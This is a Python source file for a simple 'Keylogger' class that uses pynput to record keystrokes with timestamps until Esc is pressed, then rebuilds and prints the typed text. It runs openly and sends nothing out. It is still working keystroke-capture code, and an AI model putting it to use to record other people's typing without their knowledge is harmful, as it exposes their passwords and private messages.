import copy
import time
from pynput.keyboard import Key, Listener


class Keylogger:

    def __on_press(self, key):
        self.raw_input.append((key, time.time()))

    def __on_release(self, key):
        if key == Key.esc:
            self.raw_input.pop()
            return False

    # this algorithm could be done better
    def __set_screen_input(self):
        self.screen_input = [character for character
                             in self.raw_input
                             if character[0] not in [Key.esc, Key.ctrl, Key.alt, Key.shift]]
        i = len(self.screen_input) - 1
        backspaces = 0
        while i >= 0:
            if self.screen_input[i][0] == Key.backspace:
                self.screen_input.pop(i)
                backspaces += 1
            elif backspaces != 0:
                self.screen_input.pop(i)
                backspaces -= 1
            i -= 1
        # not sure how this behaves if special keyboard keys are pressed other than space
        self.screen_input = list(map(lambda character: (' ' if character[0] == Key.space else character[0].char,
                                                        character[1]), self.screen_input))

    def __simplify_time(self, input_list):
        return list(map(lambda character: (character[0], character[1] - self.start_time), input_list))

    def __init__(self):
        self.raw_input = []
        self.screen_input = []
        self.start_time = 0

    def run_keylogger(self):
        self.start_time = time.time()
        with Listener(
                on_press=self.__on_press,
                on_release=self.__on_release
        ) as listener:
            listener.join()
        self.__set_screen_input()
        self.screen_input = self.__simplify_time(self.screen_input)

    def as_words(self):
        return ''.join([character[0] for character in self.screen_input])


def main():
    test_keylogger = Keylogger()
    test_keylogger.run_keylogger()
    print(test_keylogger.as_words())


if __name__ == '__main__':
    main()
